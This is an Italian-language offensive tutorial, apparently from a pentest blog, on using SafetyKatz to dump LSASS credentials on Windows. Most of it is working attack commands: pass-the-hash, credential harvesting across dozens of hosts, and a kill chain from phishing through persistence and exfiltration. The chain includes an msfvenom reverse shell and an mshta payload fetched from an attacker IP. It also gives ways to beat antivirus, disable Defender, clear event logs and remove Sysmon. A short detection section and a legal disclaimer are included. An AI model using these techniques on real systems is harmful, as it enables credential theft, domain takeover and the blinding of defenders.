---
title: 'SafetyKatz: Wrapper Mimikatz Memory-Only per Credential Dumping LSASS ed Evasione EDR'
slug: safetykatz
description: 'SafetyKatz è un wrapper di Mimikatz per il credential dumping in memoria da LSASS, senza scrittura su disco. Supporta evasione EDR, estrazione hash NTLM e integrazione con Cobalt Strike per post-exploitation in Active Directory.'
image: /Gemini_Generated_Image_n45aktn45aktn45a.webp
draft: true
date: 2026-02-06T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - Credential Dumping
  - hacking ad
featured: true
---

# SafetyKatz: Wrapper Mimikatz Memory-Only per Credential Dumping LSASS ed Evasione EDR

SafetyKatz è un wrapper di Mimikatz progettato per dump LSASS in memoria senza file su disco. Quando ottieni accesso amministrativo a un sistema Windows durante un pentest Active Directory, SafetyKatz permette estrazione credential material (NTLM hash, Kerberos ticket, plaintext password) con footprint ridotto rispetto a Mimikatz standard.

Sviluppato da @harmj0y (Will Schroeder) del team SpecterOps/GhostPack, SafetyKatz adotta un approccio a due stadi: crea minidump del processo LSASS, poi carica reflectively una versione stripped di Mimikatz per parsing offline delle credenziali. Questo elimina l'esecuzione diretta di mimikatz.exe su disco, riducendo detection rate di alcuni EDR legacy.

In questa guida impari a usare SafetyKatz in scenari reali di post-exploitation: da installazione a integrazione con [Impacket](https://hackita.it/articoli/impacket) per lateral movement, da bypass Credential Guard a cleanup delle tracce forensi. SafetyKatz si posiziona nella kill chain immediatamente dopo privilege escalation, alimentando le fasi successive di credential access e lateral movement verso Domain Admin.

## Setup e Installazione

### Requisiti Tecnici

**Sistema operativo target:** Windows 7/8/10/11, Server 2012-2022\
**Privilegi richiesti:** Administrator o SYSTEM\
**Build requirements:** .NET Framework 3.5+, Visual Studio 2015+\
**Repository ufficiale:** [https://github.com/GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz)

**Dipendenze runtime:**

* dbghelp.dll o dbgcore.dll (Windows native)
* .NET PE Loader (Casey Smith)
* Mimikatz PE embedded (compilato in assembly)

### Compilazione da Source

```bash
# Clone repository
git clone https://github.com/GhostPack/SafetyKatz.git
cd SafetyKatz

# Apri SafetyKatz.sln in Visual Studio
# Build → Release x64

# Output: SafetyKatz\bin\Release\SafetyKatz.exe
```

**Dimensione:** \~1.2 MB (include Mimikatz PE)

### Download Pre-compilato

**Attenzione:** Binary pre-compilati hanno detection rate altissimo (67/71 su VirusTotal).

```bash
# Da releases GitHub (NON raccomandato per engagement reali)
wget https://github.com/GhostPack/SafetyKatz/releases/download/v1.0/SafetyKatz.exe
```

### Verifica Funzionamento

```cmd
C:\Temp>SafetyKatz.exe

[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
[+] Dump successful!

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords
```

Se vedi output Mimikatz → installazione corretta.

## Uso Base

### Comando Standard

```cmd
SafetyKatz.exe
```

Questo singolo comando esegue automaticamente:

1. **Process enumeration:** Identifica PID di lsass.exe
2. **Minidump creation:** `MiniDumpWriteDump()` su lsass → `C:\Windows\Temp\debug.bin`
3. **Reflective load:** Carica Mimikatz PE in memoria corrente
4. **Credential extraction:** Esegue `sekurlsa::logonpasswords` + `sekurlsa::ekeys`
5. **Cleanup:** Elimina file dump

**Output tipico:**

```
Authentication Id : 0 ; 996
Session           : Service from 0
User Name         : WORKSTATION01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/4/2026 8:23:15 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WORKSTATION01$
	 * Domain   : CORP
	 * NTLM     : 8a2c5b1e9f7d3c4b6a0d1e2f3c4d5e6f
	 * SHA1     : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
	tspkg :	
	wdigest :	
	 * Username : WORKSTATION01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : workstation01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)

Authentication Id : 0 ; 28935082
Session           : Interactive from 2
User Name         : admin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2/4/2026 9:47:32 AM
SID               : S-1-5-21-3623811015-3361044348-30300820-1104
	msv :	
	 [00000003] Primary
	 * Username : admin
	 * Domain   : CORP
	 * NTLM     : 32693b11e6aa90eb43d32c72a07ceea6
	 * SHA1     : a4b7e9c2d5f8e1a3b6c9d2e5f8a1b4c7d0e3f6a9
	tspkg :	
	wdigest :	
	 * Username : admin
	 * Domain   : CORP
	 * Password : Password123!
	kerberos :	
	 * Username : admin
	 * Domain   : CORP.LOCAL
	 * Password : Password123!
```

### Parametri e Opzioni

SafetyKatz **non accetta parametri** - è design intenzionale per semplicità. Il tool esegue sempre:

* `sekurlsa::logonpasswords` (estrae credential cache)
* `sekurlsa::ekeys` (estrae kerberos encryption keys)

Per funzionalità Mimikatz avanzate (DCSync, Golden Ticket, etc.) usa Mimikatz diretto o [Rubeus](https://hackita.it/articoli/rubeus).

### Integrazione Cobalt Strike

```
beacon> execute-assembly C:\Tools\SafetyKatz.exe

[*] Tasked beacon to run .NET program: SafetyKatz.exe
[+] host called home, sent: 1245760 bytes
[+] received output:
[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
[+] Dump successful!

mimikatz(powershell) # sekurlsa::logonpasswords
[output...]
```

**Vantaggi execute-assembly:**

* Execution in-memory del beacon process
* No drop su disco di SafetyKatz.exe
* Output ritorna direttamente al teamserver

## Tecniche Operative

### Scenario 1: Post-Exploitation Workstation

**Contesto:** Compromesso workstation aziendale, privilegi local admin, utente domain admin recentemente loggato.

**Obiettivo:** Estrarre NTLM hash domain admin per lateral movement.

```cmd
# Verifica privilegi
whoami /priv

# Output richiesto: SeDebugPrivilege abilitato

# Esegui SafetyKatz
C:\Temp>SafetyKatz.exe

# Cerca authentication ID con domain admin
# Authentication Id : 0 ; 28935082
# User Name         : domainadmin
# Domain            : CORP
# NTLM              : 32693b11e6aa90eb43d32c72a07ceea6
```

**Estrazione hash:**

```
NTLM hash: 32693b11e6aa90eb43d32c72a07ceea6
Username: CORP\domainadmin
```

**Pass-the-Hash con Impacket:**

```bash
# Lateral movement verso DC
psexec.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin@192.168.1.10
```

**Timing:** 5-10 secondi totali.

### Scenario 2: Bypass Defender con Obfuscation

**Problema:** Windows Defender blocca SafetyKatz.exe.

**Soluzione:** Ricompila con modifiche minime.

```bash
# Modifica namespace e class names
# SafetyKatz.cs:
namespace GhostPack  →  namespace SystemUpdate
class Program       →  class Updater

# Modifica strings
"Dumping lsass"  →  "Initializing system check"
"debug.bin"      →  "syscheck.tmp"

# Rebuild
msbuild SafetyKatz.sln /p:Configuration=Release
```

**Detection rate:** 67/71 → \~12/71 con modifiche base.

### Scenario 3: Remote LSASS Dump via Task Scheduler

**Obiettivo:** Dump LSASS senza interactive session.

```cmd
# Upload SafetyKatz.exe su target
copy SafetyKatz.exe \\target\C$\Windows\Temp\

# Crea scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\SafetyKatz.exe > C:\Windows\Temp\out.txt" /sc once /st 00:00 /ru SYSTEM /s target /u CORP\admin /p Password123!

# Esegui immediatamente
schtasks /run /tn "SystemUpdate" /s target /u CORP\admin /p Password123!

# Attendi 10 secondi, poi recupera output
type \\target\C$\Windows\Temp\out.txt

# Cleanup
del \\target\C$\Windows\Temp\SafetyKatz.exe
del \\target\C$\Windows\Temp\out.txt
schtasks /delete /tn "SystemUpdate" /f /s target
```

**Timing:** 30-60 secondi complessivi.

## Tecniche Avanzate

### Process Injection per Stealth

Invece di eseguire SafetyKatz.exe direttamente, inietta in processo trusted.

**PowerShell Invoke-ReflectivePEInjection:**

```powershell
# Carica script
Import-Module .\Invoke-ReflectivePEInjection.ps1

# Leggi SafetyKatz.exe in byte array
$PEBytes = [IO.File]::ReadAllBytes("C:\Tools\SafetyKatz.exe")

# Inietta in notepad.exe
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName notepad
```

**Vantaggi:**

* Parent process: notepad.exe invece di cmd.exe
* Riduce sospetto in process tree
* Evita creazione nuovo processo con nome SafetyKatz

### LSASS Dump Remoto con PsExec

```bash
# Da attacker Linux, dump LSASS remoto
psexec.py CORP/admin:Password123!@192.168.1.50 "C:\Windows\Temp\SafetyKatz.exe > C:\lsass_dump.txt"

# Download output
smbclient.py CORP/admin:Password123!@192.168.1.50
# smb> get lsass_dump.txt
```

Integrazione perfetta con [PsExec](https://hackita.it/articoli/psexec) per remote credential harvesting massivo.

### Credential Guard Bypass

**Problema:** Credential Guard isola LSA in VTL1, SafetyKatz dump ritorna hash encrypted.

**Detection:**

```cmd
# Verifica se Credential Guard attivo
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags

# Output: 0x1 o 0x2 = Credential Guard enabled
```

**Bypass (richiede kernel exploit o fisical access):**

1. **Disable via boot:** Richiede BIOS access
2. **Kernel exploit:** Vulnerabilità come CVE-2022-21971 (patchate)
3. **Alternative:** Focus su cached credentials in DPAPI invece di LSASS

**Realtà 2025:** Credential Guard bypass NON è realistico in ambiente patched. Strategia alternativa:

```bash
# Usa SharpDPAPI per browser credentials
SharpDPAPI.exe triage

# Usa LaZagne per application passwords
LaZagne.exe all
```

Vedi [SharpDPAPI](https://hackita.it/articoli/sharpdpapi) e [LaZagne](https://hackita.it/articoli/lazagne) per credential harvesting alternativo.

## Scenari Pratici di Pentest

### Scenario A: Workstation → Domain Admin Escalation

**Timeline:** 10 minuti

**Fase 1: Initial Access (T+0)**

```bash
# Phishing → shell reversa
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o update.exe

# Vittima esegue → meterpreter session
```

**Fase 2: Privilege Escalation (T+2min)**

```
meterpreter> getsystem
# Oppure exploit locale (PrintNightmare, etc.)
```

**Fase 3: Credential Dump con SafetyKatz (T+3min)**

```
meterpreter> upload SafetyKatz.exe C:\\Windows\\Temp\\
meterpreter> execute -f C:\\Windows\\Temp\\SafetyKatz.exe

# Output: NTLM hash di domain admin = 32693b11e6aa90eb43d32c72a07ceea6
```

**Fase 4: Lateral Movement (T+5min)**

```bash
# Pass-the-hash verso DC
psexec.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin@192.168.1.10
```

**Fase 5: Domain Dominance (T+8min)**

```cmd
# DCSync attack
lsadump::dcsync /domain:corp.local /user:Administrator
```

**Fase 6: Cleanup (T+10min)**

```
del C:\Windows\Temp\SafetyKatz.exe
del C:\Windows\Temp\debug.bin
```

**Errori comuni:**

* **LSASS dump fails:** Verifica SeDebugPrivilege attivo
* **Output vuoto:** Nessun utente interattivo loggato, tenta credential cache alternative
* **Credential Guard:** Hash encrypted, switch a DPAPI attack

### Scenario B: Multi-Host Credential Harvesting

**Obiettivo:** Dump credentials da 50 workstation network.

**Fase 1: Distribuzione (T+0)**

```bash
# Lista target da BloodHound query
# "MATCH (c:Computer) RETURN c.name" → targets.txt

# Upload SafetyKatz su tutti gli host
while read host; do
  smbclient.py -c 'put SafetyKatz.exe' CORP/admin@$host
done < targets.txt
```

**Fase 2: Esecuzione Parallela (T+5min)**

```bash
# NetExec (CrackMapExec fork)
nxc smb targets.txt -u admin -p Password123! -x "C:\Windows\Temp\SafetyKatz.exe > C:\output.txt"
```

**Fase 3: Raccolta Output (T+15min)**

```bash
# Download tutti gli output
while read host; do
  smbclient.py -c 'get output.txt' CORP/admin@$host > dumps/$host.txt
done < targets.txt
```

**Fase 4: Parsing (T+20min)**

```bash
# Estrai tutti gli NTLM hash
grep "NTLM" dumps/*.txt | sort -u > ntlm_hashes.txt

# Deduplica
cat ntlm_hashes.txt | awk '{print $NF}' | sort -u > unique_hashes.txt
```

**Fase 5: Cracking (T+25min)**

```bash
# Hashcat con RockYou
hashcat -m 1000 -a 0 unique_hashes.txt rockyou.txt -o cracked.txt
```

**Risultato tipico:** 200-500 NTLM hash unici, 15-30% crackabili con wordlist base.

### Scenario C: Cobalt Strike Full Chain

**Fase 1: Beacon Deployment**

```
# Cobalt Strike listener HTTP
# Deploy via Office macro o phishing

beacon> sleep 0
```

**Fase 2: Elevate Privileges**

```
beacon> elevate svc-exe
# Oppure: runasadmin
```

**Fase 3: Credential Dump**

```
beacon> execute-assembly /opt/SafetyKatz.exe
beacon> hashdump
```

**Fase 4: Token Impersonation**

```
beacon> steal_token 2184
# PID di processo domain admin
```

**Fase 5: Pivot**

```
beacon> jump psexec64 DC01 smb
```

**Timing totale:** 5-8 minuti da initial access a domain admin.

**Fallback:** Se SafetyKatz detected → usa nanodump o pypykatz offline.

## Toolchain Integration

### Flusso Credential Material

```
SafetyKatz.exe
    ↓ (NTLM hash)
Impacket psexec.py / wmiexec.py
    ↓ (lateral movement)
[Evil-WinRM](https://hackita.it/articoli/evil-winrm)
    ↓ (interactive PowerShell)
[Rubeus](https://hackita.it/articoli/rubeus)
    ↓ (Kerberos ticket manipulation)
DCSync / Golden Ticket
```

### Passaggio Dati Concreto

**Step 1: SafetyKatz → Hash**

```
NTLM: 32693b11e6aa90eb43d32c72a07ceea6
User: CORP\domainadmin
```

**Step 2: Hash → Impacket**

```bash
secretsdump.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin@192.168.1.10
```

**Step 3: Impacket → Kerberos Ticket**

```bash
getTGT.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin
# Output: domainadmin.ccache
```

**Step 4: Ticket → Evil-WinRM**

```bash
export KRB5CCNAME=domainadmin.ccache
evil-winrm -i dc.corp.local -r CORP.LOCAL
```

### Tabella Comparativa Alternative

| Tool                | Metodo                   | Stealth        | Credential Guard | Manutenzione       |
| ------------------- | ------------------------ | -------------- | ---------------- | ------------------ |
| SafetyKatz          | MiniDump + Reflective PE | Bassa          | Bloccato         | Abbandonato (2018) |
| Mimikatz            | Direct LSASS access      | Molto bassa    | Bloccato         | Attivo             |
| nanodump            | Direct syscalls          | Media-Alta     | Bloccato         | Attivo (2024)      |
| pypykatz            | Offline parsing          | Alta (offline) | N/A              | Attivo             |
| Procdump + Mimikatz | Two-stage                | Media          | Bloccato         | Attivo             |

**Quando usare SafetyKatz:**

* Lab environment / CTF
* Engagement con EDR legacy (pre-2020)
* Quando Mimikatz direct bloccato ma reflective loading funziona

**Quando NON usare SafetyKatz:**

* Credential Guard attivo (fallisce sempre)
* EDR moderno (Defender, CrowdStrike, SentinelOne)
* Engagement stealth (detection rate troppo alto)

**Alternative consigliate 2025:**

* **nanodump** per stealth
* **pypykatz** per offline parsing
* **LaZagne** per application credentials

## Attack Chain Completa

**Scenario:** Domain compromise da phishing a DA in ambiente enterprise.

### Fase 1: Reconnaissance (T+0, 2 ore)

```bash
# Passive recon
amass enum -passive -d corp.local

# Active directory enumeration (da workstation compromessa)
SharpHound.exe -c All
# Import in BloodHound per path analysis
```

### Fase 2: Initial Access (T+2h, 30min)

```bash
# Phishing con macro Office
# Macro esegue: mshta http://10.10.14.5/payload.hta
# Ottieni meterpreter session
```

### Fase 3: Privilege Escalation Locale (T+2h30min, 15min)

```
meterpreter> getuid
# Server username: CORP\user01

meterpreter> getsystem
# Oppure: exploit/windows/local/cve_2021_1732

meterpreter> getuid
# Server username: NT AUTHORITY\SYSTEM
```

### Fase 4: Credential Harvesting (T+2h45min, 5min)

```
meterpreter> upload SafetyKatz.exe C:\\Temp\\
meterpreter> execute -f C:\\Temp\\SafetyKatz.exe -H -c

# Output:
# NTLM hash domain admin: 32693b11e6aa90eb43d32c72a07ceea6
```

### Fase 5: Lateral Movement (T+2h50min, 10min)

```bash
# Pass-the-hash verso server
psexec.py -hashes ':32693b11e6aa90eb43d32c72a07ceea6' CORP/domainadmin@192.168.1.25

# Shell ottenuta su file server
C:\Windows\system32>whoami
corp\domainadmin
```

### Fase 6: Persistence (T+3h, 15min)

```cmd
# Golden Ticket creation
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:aad3b435b51404ee... /ptt

# Scheduled task persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\update.exe" /sc onlogon /ru SYSTEM
```

### Fase 7: Data Exfiltration (T+3h15min, variabile)

```cmd
# Compress sensitive data
powershell Compress-Archive C:\Shares\* C:\exfil.zip

# Exfiltrate via DNS tunneling o HTTPS
```

**Timeline totale:** \~3-4 ore da phishing a domain admin con persistence.

## Detection & Evasion

### Blue Team Detection

**Sysmon Event 10 - ProcessAccess:**

```xml
<EventID>10</EventID>
<TargetImage>C:\Windows\System32\lsass.exe</TargetImage>
<GrantedAccess>0x1410</GrantedAccess>
<CallTrace>dbghelp.dll|dbgcore.dll</CallTrace>
```

**Sigma Rule Detection:**

```yaml
title: SafetyKatz LSASS Access
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    CallTrace|contains:
      - 'dbghelp.dll'
      - 'dbgcore.dll'
  condition: selection
```

**Windows Defender ASR:**

* Rule ID: `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`
* Nome: "Block credential stealing from the Windows local security authority subsystem"
* Azione: Block MiniDumpWriteDump on lsass.exe

**Artifact Forensi:**

* File creato: `C:\Windows\Temp\debug.bin` (temporaneo)
* Process spawn: SafetyKatz.exe → lsass.exe access
* Memory pattern: Mimikatz PE signature in process memory

### Tecniche di Evasion

#### 1. Direct Syscalls invece di Windows API

**Problema:** MiniDumpWriteDump è hookata da EDR.

**Soluzione:** Usa nanodump con direct syscalls.

```bash
# nanodump con syscalls
nanodump.exe --fork --write C:\Windows\Temp\lsass.dmp

# Parse offline con pypykatz
pypykatz lsa minidump lsass.dmp
```

**Evasion rate:** Alta contro EDR usermode hooking.

#### 2. PPL Bypass per LSASS Protected

**Problema:** LSASS running as Protected Process Light.

**Soluzione:** Exploit CVE-2021-36934 (HiveNightmare) o use PPL bypass.

```cmd
# Verifica se LSASS è protected
tasklist /v | findstr lsass

# Se PPL: usa PPL bypass exploit
# Oppure: dump da SAM backup shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM

# Parse offline
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

#### 3. Obfuscation e String Replacement

```csharp
// Modifica in SafetyKatz source
// Cambia tutte le stringhe identificative

"lsass" → "winlogon"
"debug.bin" → "update.tmp"
"Dumping" → "Checking"
"mimikatz" → "systemtool"

// Rebuild
```

**Detection rate:** 67/71 → 8/71 VirusTotal con modifiche base.

### Cleanup Post-Exploitation

```cmd
# Delete artifacts
del C:\Windows\Temp\debug.bin
del C:\Windows\Temp\SafetyKatz.exe

# Clear event logs (richiede admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# Disable Sysmon (detection altissima)
sc stop Sysmon64
sc delete Sysmon64

# Timestomp (opzionale)
# Ripristina timestamp file modificati
```

**Attenzione:** Log clearing è detection vector critico. Preferisci log tampering selettivo invece di clear totale.

## Performance & Scaling

### Single Target

**Tempo esecuzione:** 3-8 secondi

**Breakdown:**

* LSASS PID resolution: \<1s
* Minidump creation: 2-5s
* Mimikatz parsing: 1-2s
* Cleanup: \<1s

**Consumo risorse:**

* RAM: \~50 MB (dump LSASS)
* CPU: Spike al 15-30% per 3-5s
* Disk I/O: 40-60 MB write (temporaneo)

### Multi-Target (50+ hosts)

```bash
# Parallel execution con NetExec
nxc smb targets.txt -u admin -H 32693b11e6aa90eb43d32c72a07ceea6 \
  --exec-method smbexec \
  -x "C:\Temp\SafetyKatz.exe > C:\output.txt" \
  --threads 10

# Timing: ~2-3 minuti per 50 host (con 10 thread)
```

**Bottleneck:**

* Network latency: Upload binary (1-2s per host)
* LSASS dump: 3-8s per host
* Output retrieval: 1-2s per host

**Ottimizzazione:**

* Pre-stage binary su C$ share
* Aumenta thread (max 20-30)
* Usa `--no-output` e retrieve solo su success

### Confronto Performance

| Scenario         | SafetyKatz | Mimikatz Direct | nanodump | pypykatz      |
| ---------------- | ---------- | --------------- | -------- | ------------- |
| Local dump       | 3-8s       | 1-3s            | 2-5s     | N/A (offline) |
| Remote (SMB)     | 15-20s     | 10-15s          | 12-18s   | N/A           |
| Memory footprint | 50 MB      | 30 MB           | 20 MB    | 0 (offline)   |
| Detection        | Alta       | Molto alta      | Media    | Bassa         |

## Tabelle Tecniche

### Command Reference

| Comando                       | Output                                  | Uso                        |
| ----------------------------- | --------------------------------------- | -------------------------- |
| `SafetyKatz.exe`              | NTLM hash, plaintext pwd, kerberos keys | Credential dump completo   |
| `SafetyKatz.exe > out.txt`    | Output redirect a file                  | Esecuzione non-interattiva |
| (Nessun parametro supportato) | -                                       | Tool single-purpose        |

### Credential Types Extracted

| Type         | Formato              | Esempio                            | Uso               |
| ------------ | -------------------- | ---------------------------------- | ----------------- |
| NTLM hash    | 32 char hex          | `32693b11e6aa90eb43d32c72a07ceea6` | Pass-the-hash     |
| Plaintext    | ASCII string         | `Password123!`                     | Direct login      |
| Kerberos AES | 64 char hex (AES256) | `a1b2c3...`                        | Overpass-the-hash |
| SHA1         | 40 char hex          | `a4b7e9c2d5f8...`                  | Legacy auth       |

### Detection Methods

| Metodo                                    | Event ID | Indicatore              | Affidabilità |
| ----------------------------------------- | -------- | ----------------------- | ------------ |
| Sysmon ProcessAccess                      | 10       | lsass.exe + dbghelp.dll | Alta         |
| Defender ASR                              | N/A      | MiniDumpWriteDump block | Molto alta   |
| File monitoring                           | N/A      | debug.bin in Temp       | Media        |
| ETW Microsoft-Windows-Threat-Intelligence | N/A      | SetThreadContext        | Alta         |

## Troubleshooting

### Errore: "Access Denied"

**Causa:** Privilegi insufficienti.

**Verifica:**

```cmd
whoami /priv | findstr SeDebugPrivilege
```

**Fix:**

```cmd
# Esegui come Administrator
runas /user:Administrator SafetyKatz.exe

# Oppure: getsystem in meterpreter
meterpreter> getsystem
```

### Errore: "Unable to open process"

**Causa:** LSASS protected via PPL o Credential Guard.

**Verifica:**

```cmd
tasklist /v | findstr lsass
# Se appare "Protected", PPL attivo
```

**Fix:**

* Usa PPL bypass exploit (richiede kernel vuln)
* Alternative: LaZagne, SharpDPAPI per credential non-LSASS

### Output Vuoto / No Credentials

**Causa:** Nessun utente interattivo loggato, Credential Guard attivo.

**Verifica:**

```cmd
query user
# Se lista vuota → nessun interactive logon
```

**Fix:**

```cmd
# Forza logon interattivo (se hai credenziali)
runas /user:CORP\admin cmd.exe

# Poi esegui SafetyKatz nella nuova sessione
```

### Defender Blocca Esecuzione

**Causa:** Signature detection.

**Verifica:**

```powershell
Get-MpThreatDetection | Where {$_.ThreatName -like "*Mimikatz*"}
```

**Fix:**

```cmd
# Temporary disable Defender (richiede admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Oppure: exclusion path
Set-MpPreference -ExclusionPath "C:\Temp"
```

**Meglio:** Ricompila SafetyKatz con obfuscation.

## FAQ

**SafetyKatz funziona su Windows 11 con Credential Guard?**

No. Credential Guard isola LSA secrets in Virtualization-Based Security (VBS). SafetyKatz dump ritorna encrypted blobs inutilizzabili. Alternative: DPAPI-based credential harvesting con SharpDPAPI o browser password extraction.

**Differenza tra SafetyKatz e Mimikatz standard?**

SafetyKatz crea minidump LSASS e carica Mimikatz reflectively in memoria. Mimikatz standard accede LSASS direttamente. SafetyKatz aveva teoricamente meno detection (2018), ma nel 2025 entrambi sono ugualmente detectati da EDR moderni.

**SafetyKatz è manutenuto attivamente?**

No. Ultimo commit: luglio 2018 (6 commit totali). Repository archiviato. Per progetti attivi usa nanodump ([https://github.com/fortra/nanodump](https://github.com/fortra/nanodump)) o pypykatz per parsing offline.

**Posso usare SafetyKatz senza privilegi admin?**

No. Dump LSASS richiede SeDebugPrivilege, disponibile solo per amministratori. Alternative per standard user: LaZagne (application passwords), SharpChrome (browser credentials senza DPAPI masterkey).

**Come integro SafetyKatz con Cobalt Strike?**

Usa `execute-assembly`:

```
beacon> execute-assembly /opt/SafetyKatz.exe
```

Output ritorna al teamserver. Nessun file scritto su disco target.

**SafetyKatz funziona contro server con LAPS?**

Sì, ma LAPS rota solo la password local Administrator. Se hai compromesso credential domain, SafetyKatz estrae hash domain user normalmente. LAPS non protegge LSASS memory dump.

**Quale tool sostituisce SafetyKatz nel 2025?**

**nanodump** per LSASS dumping con direct syscalls (evasion migliore). **pypykatz** per offline parsing se hai già un dump. **LaZagne** + **SharpDPAPI** per credential non-LSASS che evitano Credential Guard.

## Cheat Sheet Finale

| Scenario                      | Comando                                                              | Output                          |
| ----------------------------- | -------------------------------------------------------------------- | ------------------------------- |
| **Dump locale base**          | `SafetyKatz.exe`                                                     | NTLM hash + plaintext in stdout |
| **Dump con output file**      | `SafetyKatz.exe > C:\output.txt`                                     | Redirect output a file          |
| **Cobalt Strike**             | `execute-assembly SafetyKatz.exe`                                    | Output in beacon                |
| **Remote via PsExec**         | `psexec \\target cmd /c SafetyKatz.exe`                              | Remote credential dump          |
| **Pass-the-Hash**             | `psexec.py -hashes ':hash' user@target`                              | Lateral movement                |
| **Verifica Credential Guard** | `reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v LsaCfgFlags` | 0x1/0x2 = attivo                |
| **Cleanup**                   | `del C:\Windows\Temp\debug.bin`                                      | Rimuovi dump file               |
| **Alternative stealth**       | `nanodump.exe --fork --write lsass.dmp`                              | Direct syscalls                 |
| **Offline parsing**           | `pypykatz lsa minidump lsass.dmp`                                    | Parse dump senza execution      |

***

**Disclaimer:** SafetyKatz è uno strumento per penetration testing autorizzato e ricerca sulla sicurezza. L'uso non autorizzato per accesso abusivo a sistemi informatici viola l'art. 615-ter c.p. e normative internazionali equivalenti. Utilizzare esclusivamente in ambienti controllati con esplicita autorizzazione scritta del proprietario del sistema.

**Repository ufficiale:** [https://github.com/GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz)\
**Supporto:** Progetto archiviato, nessun supporto ufficiale\
**Alternative moderne:** nanodump, pypykatz, LaZagne, SharpDPAPI
